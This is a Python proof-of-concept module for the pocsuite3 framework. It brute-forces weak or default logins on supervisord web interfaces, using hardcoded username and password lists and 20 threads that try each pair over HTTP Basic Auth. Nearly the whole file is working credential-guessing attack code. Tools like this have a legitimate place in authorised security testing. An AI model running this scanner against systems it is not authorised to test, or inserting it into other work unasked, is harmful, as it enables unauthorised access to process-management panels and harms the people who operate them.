# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output, logger, POC_CATEGORY, requests
from requests.auth import HTTPBasicAuth
from pocsuite3.lib.core.threads import run_threads
import queue
import itertools

usernames = ['admin', 'root', 'supervisor', 'user', 'supervisord']
passwords = ['admin', 'root', 'supervisor', 'user', 'supervisord',
             '123', '12345', '123456', '12345678', 'admin123', 'admin888']


class SupervisordWeakpassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 11, 2020'
    createDate = 'Aug 11, 2020'
    name = 'supervisord弱口令'
    appName = 'supervisord'
    appVersion = 'v1.0.0'
    vulType = '弱口令'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _verify(self):
        result = {}
        url = self.url
        if not url.startswith('http'):
            url = 'http://'+url
        supervisord_burst(url)
        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
            result['extra'] = username+':'+password
        return self.parse_output(result)

    def _attack(self):
        return self._verify()


task_queue = queue.Queue()
result_queue = queue.Queue()


def get_word_list():
    return itertools.product(usernames, passwords)


def check_url(url):
    try:
        res = requests.get(url)
        if res.status_code in [401, 403]:
            return True
        elif res.status_code == 200:
            result_queue.put(('<empty>', '<empty>'))
            return True
    except Exception as e:
        logger.info(url+'/t'+str(e))
        return False
    return False


def supervisord_login(url, username, password):
    try:
        res = requests.get(url, auth=HTTPBasicAuth(username, password))
        if res.status_code == 200:
            return True
    except Exception as e:
        pass
    return False


def task_init(url):
    for username, password in get_word_list():
        task_queue.put((url, username, password))


def task_thread():
    while not task_queue.empty():
        url, username, password = task_queue.get()
        logger.info('try burst {} use username:{} password:{}'.format(
            url, username, password))
        if supervisord_login(url, username, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))


def supervisord_burst(url):
    if not check_url(url):
        return
    if not result_queue.empty():
        return
    try:
        task_init(url)
        run_threads(20, task_thread)
    except Exception:
        pass


register_poc(SupervisordWeakpassPOC)
